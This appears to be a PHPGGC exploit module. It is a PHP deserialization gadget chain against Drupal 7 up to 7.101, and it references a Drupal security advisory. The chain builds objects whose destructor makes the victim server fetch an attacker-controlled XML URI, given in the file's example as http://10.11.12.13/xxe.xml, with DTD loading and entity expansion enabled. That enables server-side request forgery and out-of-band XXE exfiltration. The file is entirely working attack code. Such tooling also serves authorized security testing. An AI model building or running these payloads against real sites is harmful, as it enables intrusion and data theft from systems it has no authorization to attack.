<?php

namespace GadgetChain\Drupal7;

class SSRF1 extends \PHPGGC\GadgetChain\SSRF
{
    public static $version = '<= 7.101';
    public static $vector = '__destruct';
    public static $author = 'paul-axe, mcdruid';
    public static $information = 'See: https://gist.github.com/paul-axe/2a384bb5f2d430dd3b63b2484af960f4
    See: See: https://www.drupal.org/sa-core-2024-008
    https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band';

    public function generate(array $parameters)
    {
        return new \ThemeRegistry(
            new \DatabaseStatementPrefetch(
                'SimpleXMLElement',
                [
                    $parameters['uri'], // e.g. 'http://10.11.12.13/xxe.xml'
                    LIBXML_BIGLINES | LIBXML_DTDLOAD | LIBXML_NOENT | LIBXML_PARSEHUGE,
                    true
                ]
            )
        );
    }
}
